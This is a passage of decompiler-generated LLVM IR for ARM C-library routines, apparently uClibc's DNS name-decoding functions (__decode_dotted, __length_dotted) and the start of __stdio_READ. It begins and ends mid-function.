  %v0_1b994 = phi i32 [ %v0_1b974, %dec_label_pc_1b96c ], [ %v0_1b994.pre, %dec_label_pc_1b980 ]
  %v0_1b9b4 = phi i32 [ %v2_1b974, %dec_label_pc_1b96c ], [ %v1_1b984, %dec_label_pc_1b980 ]
  %v0_1b988 = load i32, i32* %r7.global-to-local, align 4
  %v1_1b988 = add i32 %v0_1b988, 1
  store i32 %v1_1b988, i32* @lr, align 4
  %v1_1b98c = load i32, i32* %r8.global-to-local, align 4
  %v2_1b98c = sub i32 %v1_1b98c, %v0_1b988
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1b990 = icmp slt i32 %v0_1b9b4, 0
  store i1 %v1_1b990, i1* %cpsr_n.global-to-local, align 1
  %v2_1b990 = icmp eq i32 %v0_1b9b4, 0
  store i1 %v2_1b990, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1b994, i32* @r1, align 4
  %v0_1b998 = load i32, i32* @r6, align 4
  %v2_1b998 = add i32 %v0_1b998, %v1_1b988
  store i32 %v2_1b998, i32* @r0, align 4
  store i32 %v0_1b9b4, i32* @r2, align 4
  %v1_1b9a0 = add i32 %v2_1b98c, -1
  %v1_1b9a4 = add i32 %v0_1b9a4, 1
  store i32 %v1_1b9a4, i32* @r4, align 4
  br i1 %v2_1b990, label %.loopexit, label %dec_label_pc_1b9ac

dec_label_pc_1b9ac:                               ; preds = %dec_label_pc_1b988
  %v2_1b9ac = sub i32 %v0_1b9b4, %v1_1b9a0
  %v3_1b9ac = icmp ult i32 %v0_1b9b4, %v1_1b9a0
  %v4_1b9ac = xor i32 %v1_1b9a0, %v0_1b9b4
  %v5_1b9ac = xor i32 %v2_1b9ac, %v0_1b9b4
  %v6_1b9ac = and i32 %v5_1b9ac, %v4_1b9ac
  %v7_1b9ac = icmp slt i32 %v6_1b9ac, 0
  store i1 %v7_1b9ac, i1* %cpsr_v.global-to-local, align 1
  %v8_1b9ac = icmp slt i32 %v2_1b9ac, 0
  store i1 %v8_1b9ac, i1* %cpsr_n.global-to-local, align 1
  %v9_1b9ac = icmp eq i32 %v0_1b9b4, %v1_1b9a0
  store i1 %v9_1b9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1b9ac, label %dec_label_pc_1b9b4, label %.loopexit

dec_label_pc_1b9b4:                               ; preds = %dec_label_pc_1b9ac
  %v1_1b9b4 = trunc i32 %v0_1b9b4 to i8
  %v4_1b9b4 = add i32 %v0_1b998, %v0_1b988
  %v5_1b9b4 = inttoptr i32 %v4_1b9b4 to i8*
  store i8 %v1_1b9b4, i8* %v5_1b9b4, align 1
  %v0_1b9b8 = load i32, i32* @lr, align 4
  %v1_1b9b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_1b9b8 = add i32 %v1_1b9b8, %v0_1b9b8
  store i32 %v2_1b9b8, i32* %r7.global-to-local, align 4
  %v0_1b9bc = call i32 @memcpy()
  store i32 %v0_1b9bc, i32* %r0.global-to-local, align 4
  %v0_1b9c0 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1b9c0 = icmp slt i32 %v0_1b9c0, 0
  store i1 %v1_1b9c0, i1* %cpsr_n.global-to-local, align 1
  %v2_1b9c0 = icmp eq i32 %v0_1b9c0, 0
  store i1 %v2_1b9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b9c0, label %dec_label_pc_1b9e0, label %dec_label_pc_1b9b4.dec_label_pc_1b9c8_crit_edge

dec_label_pc_1b9b4.dec_label_pc_1b9c8_crit_edge:  ; preds = %dec_label_pc_1b9b4
  %v0_1b9c8.pre = load i32, i32* @r4, align 4
  store i32 %v0_1b9c8.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1b9c8 = icmp slt i32 %v0_1b9c8.pre, 0
  store i1 %v1_1b9c8, i1* %cpsr_n.global-to-local, align 1
  %v2_1b9c8 = icmp eq i32 %v0_1b9c8.pre, 0
  store i1 %v2_1b9c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b9c8, label %dec_label_pc_1b9e0, label %dec_label_pc_1b9d4

dec_label_pc_1b9d4:                               ; preds = %entry, %dec_label_pc_1b9b4.dec_label_pc_1b9c8_crit_edge
  %v0_1b96c21 = phi i32 [ %v0_1b9c8.pre, %dec_label_pc_1b9b4.dec_label_pc_1b9c8_crit_edge ], [ %tmp, %entry ]
  %v1_1b9d4 = inttoptr i32 %v0_1b96c21 to i8*
  %v2_1b9d4 = load i8, i8* %v1_1b9d4, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b9d8 = icmp eq i8 %v2_1b9d4, 0
  store i1 %v2_1b9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b9d8, label %dec_label_pc_1b9e0, label %dec_label_pc_1b96c

dec_label_pc_1b9e0:                               ; preds = %dec_label_pc_1b9b4.dec_label_pc_1b9c8_crit_edge, %dec_label_pc_1b9b4, %dec_label_pc_1b9d4, %entry
  %v0_1b9e0 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1b9e0 = icmp slt i32 %v0_1b9e0, 0
  store i1 %v1_1b9e0, i1* %cpsr_n.global-to-local, align 1
  %v2_1b9e0 = icmp eq i32 %v0_1b9e0, 0
  store i1 %v2_1b9e0, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_1b9e0, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1b9e0
  %v5_1b9e8 = load i32, i32* %r7.global-to-local, align 4
  %v6_1b9e8 = add i32 %v5_1b9e8, 1
  store i32 %v6_1b9e8, i32* %r0.global-to-local, align 4
  %v7_1b9ec = load i32, i32* @r6, align 4
  %v9_1b9ec = add i32 %v7_1b9ec, %v5_1b9e8
  %v10_1b9ec = inttoptr i32 %v9_1b9ec to i8*
  store i8 0, i8* %v10_1b9ec, align 1
  %v0_1b9f0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1b9f0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1b9f0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1b9e0, %bb
  %v2_1b9f0 = phi i1 [ %v2_1b9f0.pre, %bb ], [ false, %dec_label_pc_1b9e0 ]
  %v1_1b9f0 = phi i1 [ %v1_1b9f0.pre, %bb ], [ %v1_1b9e0, %dec_label_pc_1b9e0 ]
  %v0_1b9f0 = phi i1 [ %v0_1b9f0.pre, %bb ], [ %v2_1b9e0, %dec_label_pc_1b9e0 ]
  %v3_1b9f0 = xor i1 %v2_1b9f0, %v1_1b9f0
  %v4_1b9f0 = or i1 %v0_1b9f0, %v3_1b9f0
  br i1 %v4_1b9f0, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_1b9f0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_1b9f0, i32* @r4, align 4
  store i32 %v6_1b954, i32* @r5, align 4
  store i32 %v9_1b954, i32* @r6, align 4
  %v25_1b9f0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_1b9f0

.loopexit:                                        ; preds = %dec_label_pc_1b9ac, %dec_label_pc_1b988, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1b9f8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1b9f8, i32* @r4, align 4
  store i32 %v6_1b954, i32* @r5, align 4
  store i32 %v9_1b954, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1b9e0, { 0, 2, 1 }
  uselistorder i32 %v0_1b9c8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1b9c0, { 1, 0 }
  uselistorder i32 %v2_1b9ac, { 1, 0 }
  uselistorder i32 %v1_1b9a0, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1b9b4, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1b984, { 1, 0 }
  uselistorder i32 %v0_1b974, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1b9c820, { 1, 0 }
  uselistorder i32 %v9_1b954, { 1, 0 }
  uselistorder i32 %v6_1b954, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 38, 36, 39, 37, 42, 40, 43, 41, 45, 44, 47, 46, 49, 48, 51, 50 }
  uselistorder i32 (i8*)* @strlen, { 15, 24, 23, 14, 9, 8, 7, 6, 25, 22, 21, 13, 11, 12, 10, 20, 19, 18, 28, 27, 26, 17, 16, 1, 4, 5, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 4, 3, 2, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 6, 7, 1, 5, 2, 3, 4 }
  uselistorder i32* @r6, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 10, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 1, 0, 17, 18, 19, 20, 21, 72, 2, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 3, 11, 85, 86, 4, 87, 88, 89, 90, 91, 92, 5, 93, 94, 95, 96, 97, 6, 98, 99, 100, 101, 103, 102, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 7, 131, 132, 133, 134, 135, 136, 137, 191, 196, 33, 34, 22, 23, 24, 35, 36, 37, 38, 25, 26, 188, 189, 190, 165, 166, 8, 167, 168, 169, 170, 171, 172, 173, 12, 174, 175, 9, 138, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 14, 15, 16, 149, 150, 151, 152, 163, 164, 13, 192, 193, 194, 195, 27, 28, 29, 30, 31, 32, 39, 40, 41 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_1b9e0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1b9d4, { 1, 0 }
  uselistorder label %dec_label_pc_1b988, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1b9fc = load i32, i32* @r4, align 4
  %v6_1b9fc = load i32, i32* @r5, align 4
  %v0_1ba00 = load i32, i32* @r0, align 4
  store i32 %v0_1ba00, i32* %sl.global-to-local, align 4
  %v2_1ba00 = icmp eq i32 %v0_1ba00, 0
  br i1 %v2_1ba00, label %.thread16, label %dec_label_pc_1baa0.preheader

.thread16:                                        ; preds = %entry
  %v0_1ba0c1 = load i32, i32* @r2, align 4
  store i32 %v0_1ba0c1, i32* %sb.global-to-local, align 4
  %v0_1ba102 = load i32, i32* @r3, align 4
  store i32 %v0_1ba102, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1bac0

dec_label_pc_1baa0.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1ba0c = load i32, i32* @r2, align 4
  store i32 %v0_1ba0c, i32* %sb.global-to-local, align 4
  %v0_1ba10 = load i32, i32* @r3, align 4
  store i32 %v0_1ba10, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_1baa03952 = load i32, i32* @r1, align 4
  %v2_1baa04053 = add i32 %v1_1baa03952, %v0_1ba00
  %v3_1baa04154 = inttoptr i32 %v2_1baa04053 to i8*
  %v4_1baa04255 = load i8, i8* %v3_1baa04154, align 1
  %v6_1baa04356 = zext i8 %v4_1baa04255 to i32
  store i32 %v6_1baa04356, i32* @r4, align 4
  %v2_1baa44457 = icmp eq i8 %v4_1baa04255, 0
  br i1 %v2_1baa44457, label %bb35, label %dec_label_pc_1ba24.lr.ph

dec_label_pc_1ba24:                               ; preds = %dec_label_pc_1ba24.lr.ph, %bb30
  %v2_1baac50 = phi i1 [ %v2_1baac4663, %dec_label_pc_1ba24.lr.ph ], [ true, %bb30 ]
  %v6_1baa048 = phi i32 [ %v6_1baa04361, %dec_label_pc_1ba24.lr.ph ], [ %v6_1baa0, %bb30 ]
  %v1_1baa047 = phi i32 [ %v1_1baa03960, %dec_label_pc_1ba24.lr.ph ], [ %v5_1ba4c, %bb30 ]
  %v1_1ba28 = and i32 %v6_1baa048, 192
  br i1 %v2_1baac50, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_1ba24
  %v1_1ba2c = load i32, i32* %r8.global-to-local, align 4
  %v2_1ba2c = add i32 %v1_1ba2c, 1
  store i32 %v2_1ba2c, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1ba24, %bb
  %v2_1ba30 = icmp eq i32 %v1_1ba28, 192
  %v1_1ba34 = add i32 %v1_1baa047, 1
  store i32 %v1_1ba34, i32* @r5, align 4
  br i1 %v2_1ba30, label %dec_label_pc_1ba3c, label %dec_label_pc_1ba5c

dec_label_pc_1ba3c:                               ; preds = %bb28
  %v2_1ba3c = add i32 %v1_1ba34, %v0_1ba3c.ph59
  %v3_1ba3c = inttoptr i32 %v2_1ba3c to i8*
  %v4_1ba3c = load i8, i8* %v3_1ba3c, align 1
  %v6_1ba3c = zext i8 %v4_1ba3c to i32
  %v1_1ba44 = urem i32 %v6_1baa048, 64
  br i1 %v2_1baac50, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_1ba3c
  %v1_1ba48 = load i32, i32* %r8.global-to-local, align 4
  %v2_1ba48 = add i32 %v1_1ba48, 1
  store i32 %v2_1ba48, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1ba3c, %bb29
  %v4_1ba4c = mul nuw nsw i32 %v1_1ba44, 256
  %v5_1ba4c = or i32 %v6_1ba3c, %v4_1ba4c
  store i32 %v5_1ba4c, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_1baa0 = add i32 %v5_1ba4c, %v0_1ba3c.ph59
  %v3_1baa0 = inttoptr i32 %v2_1baa0 to i8*
  %v4_1baa0 = load i8, i8* %v3_1baa0, align 1
  %v6_1baa0 = zext i8 %v4_1baa0 to i32
  store i32 %v6_1baa0, i32* @r4, align 4
  %v2_1baa4 = icmp eq i8 %v4_1baa0, 0
  br i1 %v2_1baa4, label %dec_label_pc_1baac.bb36_crit_edge, label %dec_label_pc_1ba24

dec_label_pc_1ba5c:                               ; preds = %bb28
  %v2_1ba5c = add i32 %v6_1baa048, %storemerge17.ph58
  store i32 %v2_1ba5c, i32* %r6.global-to-local, align 4
  %v2_1ba60 = load i32, i32* %stack_var_-40, align 4
  %v1_1ba64 = add i32 %v2_1ba5c, 1
  store i32 %v1_1ba64, i32* %r7.global-to-local, align 4
  %v3_1ba68 = icmp ult i32 %v1_1ba64, %v2_1ba60
  br i1 %v3_1ba68, label %dec_label_pc_1ba70, label %dec_label_pc_1bac0

dec_label_pc_1ba70:                               ; preds = %dec_label_pc_1ba5c
  %v2_1ba70 = add i32 %v1_1ba34, %v0_1ba3c.ph59
  store i32 %v2_1ba70, i32* @r1, align 4
  %v0_1ba74 = load i32, i32* %sb.global-to-local, align 4
  %v2_1ba74 = add i32 %v0_1ba74, %storemerge17.ph58
  store i32 %v2_1ba74, i32* @r0, align 4
  store i32 %v6_1baa048, i32* @r2, align 4
  %v0_1ba7c = call i32 @memcpy()
  %v0_1ba80 = load i32, i32* @r5, align 4
  %v1_1ba80 = load i32, i32* @r4, align 4
  %v2_1ba80 = add i32 %v1_1ba80, %v0_1ba80
  store i32 %v2_1ba80, i32* %r1.global-to-local, align 4
  %v0_1ba84 = load i32, i32* %sl.global-to-local, align 4
  %v2_1ba84 = add i32 %v0_1ba84, %v2_1ba80
  %v3_1ba84 = inttoptr i32 %v2_1ba84 to i8*
  %v4_1ba84 = load i8, i8* %v3_1ba84, align 1
  %v0_1ba88 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ba88 = icmp eq i32 %v0_1ba88, 0
  br i1 %v2_1ba88, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_1ba70
  %v1_1ba8c = load i32, i32* %r8.global-to-local, align 4
  %v3_1ba8c = add i32 %v1_1ba8c, %v1_1ba80
  store i32 %v3_1ba8c, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_1ba70, %bb31
  %v2_1ba90 = icmp eq i8 %v4_1ba84, 0
  br i1 %v2_1ba90, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1ba98.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1ba98 = load i32, i32* %sb.global-to-local, align 4
  %v3_1ba98 = load i32, i32* %r6.global-to-local, align 4
  %v4_1ba98 = add i32 %v3_1ba98, %v2_1ba98
  %v5_1ba98 = inttoptr i32 %v4_1ba98 to i8*
  store i8 %v0_1ba98.off0, i8* %v5_1ba98, align 1
  %v0_1ba9c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1baa0.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1baac.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1baa039 = load i32, i32* %r1.global-to-local, align 4
  %v2_1baa040 = add i32 %v1_1baa039, %v0_1baa0.pre.pre
  %v3_1baa041 = inttoptr i32 %v2_1baa040 to i8*
  %v4_1baa042 = load i8, i8* %v3_1baa041, align 1
  %v6_1baa043 = zext i8 %v4_1baa042 to i32
  store i32 %v6_1baa043, i32* @r4, align 4
  %v2_1baa444 = icmp eq i8 %v4_1baa042, 0
  %v2_1baac46 = icmp eq i32 %v0_1baac.pre.pre, 0
  br i1 %v2_1baa444, label %dec_label_pc_1baac, label %dec_label_pc_1ba24.lr.ph

dec_label_pc_1ba24.lr.ph:                         ; preds = %dec_label_pc_1baa0.preheader, %bb34
  %v2_1baac4663 = phi i1 [ %v2_1baac46, %bb34 ], [ false, %dec_label_pc_1baa0.preheader ]
  %v6_1baa04361 = phi i32 [ %v6_1baa043, %bb34 ], [ %v6_1baa04356, %dec_label_pc_1baa0.preheader ]
  %v1_1baa03960 = phi i32 [ %v1_1baa039, %bb34 ], [ %v1_1baa03952, %dec_label_pc_1baa0.preheader ]
  %v0_1ba3c.ph59 = phi i32 [ %v0_1baa0.pre.pre, %bb34 ], [ %v0_1ba00, %dec_label_pc_1baa0.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_1ba9c.pre, %bb34 ], [ 0, %dec_label_pc_1baa0.preheader ]
  br label %dec_label_pc_1ba24

dec_label_pc_1baac:                               ; preds = %bb34
  br i1 %v2_1baac46, label %dec_label_pc_1baac.bb36_crit_edge, label %bb35

dec_label_pc_1baac.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_1baac
  %v0_1bab4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bac0

bb35:                                             ; preds = %dec_label_pc_1baa0.preheader, %dec_label_pc_1baac
  %v1_1bab0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bab0 = add i32 %v1_1bab0, 1
  store i32 %v2_1bab0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bac0

dec_label_pc_1bac0:                               ; preds = %dec_label_pc_1ba5c, %bb35, %dec_label_pc_1baac.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_1bab4.pre, %dec_label_pc_1baac.bb36_crit_edge ], [ %v2_1bab0, %bb35 ], [ -1, %dec_label_pc_1ba5c ]
  store i32 %v3_1b9fc, i32* @r4, align 4
  store i32 %v6_1b9fc, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_1ba3c.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_1baa0, { 1, 0 }
  uselistorder i32 %v5_1ba4c, { 0, 2, 1 }
  uselistorder i32 %v6_1baa048, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1baac50, { 1, 0 }
  uselistorder i32 %v0_1ba00, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 2, 1, 0, 3 }
  uselistorder i1 false, { 0, 8, 40, 36, 41, 42, 43, 44, 45, 2, 75, 4, 46, 13, 47, 48, 49, 12, 50, 51, 53, 54, 55, 56, 57, 58, 59, 52, 15, 60, 28, 16, 29, 61, 62, 63, 18, 17, 9, 10, 64, 65, 66, 11, 19, 67, 30, 31, 68, 32, 33, 20, 37, 38, 5, 21, 69, 34, 35, 70, 71, 14, 22, 72, 73, 74, 39, 76, 1, 25, 24, 26, 23, 6, 7, 27, 3, 77 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 14, 13, 20, 12, 11, 10, 3, 2, 9, 8, 1, 0, 4, 7, 6, 5, 21, 19, 18, 17, 16, 15 }
  uselistorder i32* @r3, { 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 22, 1, 2, 18, 21, 19, 20, 4, 5, 3, 23 }
  uselistorder i32* @r5, { 86, 87, 88, 89, 90, 91, 92, 8, 93, 94, 95, 96, 97, 98, 99, 5, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 27, 39, 9, 3, 40, 116, 120, 117, 118, 119, 23, 125, 121, 122, 123, 124, 126, 127, 128, 10, 129, 130, 131, 11, 132, 133, 134, 135, 136, 137, 138, 139, 140, 12, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 13, 154, 155, 156, 157, 158, 14, 160, 159, 4, 161, 15, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 176, 175, 25, 177, 60, 61, 62, 63, 64, 65, 277, 278, 178, 179, 180, 181, 182, 183, 184, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 185, 186, 0, 187, 188, 189, 190, 191, 192, 291, 292, 293, 294, 1, 295, 296, 297, 66, 67, 68, 69, 70, 71, 41, 42, 43, 44, 45, 46, 47, 81, 16, 7, 82, 48, 49, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 72, 73, 74, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 17, 251, 252, 28, 299, 300, 301, 302, 193, 18, 194, 195, 196, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 197, 19, 198, 199, 200, 201, 202, 203, 204, 29, 205, 206, 20, 207, 208, 209, 210, 211, 212, 26, 213, 214, 215, 216, 30, 220, 21, 221, 222, 223, 224, 225, 226, 227, 228, 6, 229, 230, 231, 232, 233, 234, 37, 38, 217, 2, 218, 219, 22, 235, 236, 237, 51, 50, 24, 303, 304, 75, 76, 77, 78, 79, 80, 298, 52, 53, 54, 55, 56, 57, 58, 59, 31, 32, 33, 34, 35, 36, 83, 84, 85 }
  uselistorder label %dec_label_pc_1bac0, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_1baac.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1ba24.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_1bacc = load i32, i32* @r0, align 4
  store i32 %v0_1bacc, i32* @lr, align 4
  %v2_1bacc = icmp eq i32 %v0_1bacc, 0
  br i1 %v2_1bacc, label %bb, label %dec_label_pc_1bae4

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_1badc:                               ; preds = %dec_label_pc_1baec
  %v1_1badc = add i32 %v1_1baf4, 2
  br label %dec_label_pc_1bb0c

dec_label_pc_1bae4:                               ; preds = %entry
  %v0_1bae4 = load i32, i32* @r1, align 4
  br label %dec_label_pc_1baf4

dec_label_pc_1baec:                               ; preds = %dec_label_pc_1baf4
  %v1_1bb00 = and i32 %v6_1baf4, 192
  %v2_1bb04 = add i32 %v6_1baf4, %v1_1baf8
  %v2_1baec = icmp eq i32 %v1_1bb00, 192
  br i1 %v2_1baec, label %dec_label_pc_1badc, label %dec_label_pc_1baf4

dec_label_pc_1baf4:                               ; preds = %dec_label_pc_1baec, %dec_label_pc_1bae4
  %v1_1baf4 = phi i32 [ %v2_1bb04, %dec_label_pc_1baec ], [ %v0_1bae4, %dec_label_pc_1bae4 ]
  %v2_1baf4 = add i32 %v1_1baf4, %v0_1bacc
  %v3_1baf4 = inttoptr i32 %v2_1baf4 to i8*
  %v4_1baf4 = load i8, i8* %v3_1baf4, align 1
  %v6_1baf4 = zext i8 %v4_1baf4 to i32
  %v1_1baf8 = add i32 %v1_1baf4, 1
  %v2_1bafc = icmp eq i8 %v4_1baf4, 0
  br i1 %v2_1bafc, label %dec_label_pc_1bb0c, label %dec_label_pc_1baec

dec_label_pc_1bb0c:                               ; preds = %dec_label_pc_1baf4, %dec_label_pc_1badc
  %v1_1bb0c = phi i32 [ %v1_1badc, %dec_label_pc_1badc ], [ %v1_1baf8, %dec_label_pc_1baf4 ]
  %v2_1bb0c = sub i32 %v1_1bb0c, %v0_1bae4
  ret i32 %v2_1bb0c

; uselistorder directives
  uselistorder i32 %v6_1baf4, { 1, 0 }
  uselistorder i32 %v1_1baf4, { 2, 1, 0 }
  uselistorder i32 %v0_1bacc, { 0, 2, 1 }
  uselistorder i8 0, { 65, 16, 24, 25, 66, 15, 21, 67, 68, 47, 72, 70, 46, 71, 69, 45, 39, 8, 9, 73, 74, 78, 79, 23, 61, 62, 75, 76, 77, 14, 80, 40, 48, 82, 81, 49, 41, 83, 84, 85, 86, 87, 88, 22, 0, 1, 89, 10, 52, 93, 2, 91, 90, 50, 3, 92, 51, 4, 94, 95, 26, 5, 97, 96, 53, 98, 99, 100, 101, 42, 43, 103, 104, 102, 11, 12, 13, 105, 6, 106, 27, 107, 17, 108, 18, 63, 28, 29, 7, 109, 110, 111, 113, 114, 115, 116, 112, 44, 117, 118, 119, 120, 121, 19, 30, 31, 32, 33, 34, 35, 123, 122, 36, 124, 125, 37, 126, 54, 20, 127, 128, 129, 131, 55, 132, 133, 130, 134, 135, 136, 137, 139, 138, 140, 143, 141, 142, 144, 147, 145, 146, 148, 64, 149, 150, 151, 152, 169, 170, 166, 167, 168, 164, 165, 162, 163, 160, 161, 158, 159, 154, 155, 156, 157, 153, 171, 172, 173, 174, 175, 176, 177, 178, 180, 179, 182, 181, 183, 56, 185, 184, 38, 186, 57, 187, 189, 190, 188, 58, 191, 192, 60, 193, 59, 194, 195, 196, 197, 198, 199, 200, 201 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 6, 3 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1bb14 = load i32, i32* @r4, align 4
  store i32 %v3_1bb14, i32* %stack_var_-12, align 4
  %v3_1bb18 = load i8, i8* %arg1, align 1
  %v4_1bb18 = zext i8 %v3_1bb18 to i32
  store i32 %v4_1bb18, i32* %r3.global-to-local, align 4
  %v1_1bb1c = and i32 %v4_1bb18, 4
  store i32 %v1_1bb1c, i32* %r5.global-to-local, align 4
  %v2_1bb1c = icmp eq i32 %v1_1bb1c, 0
  store i1 %v2_1bb1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
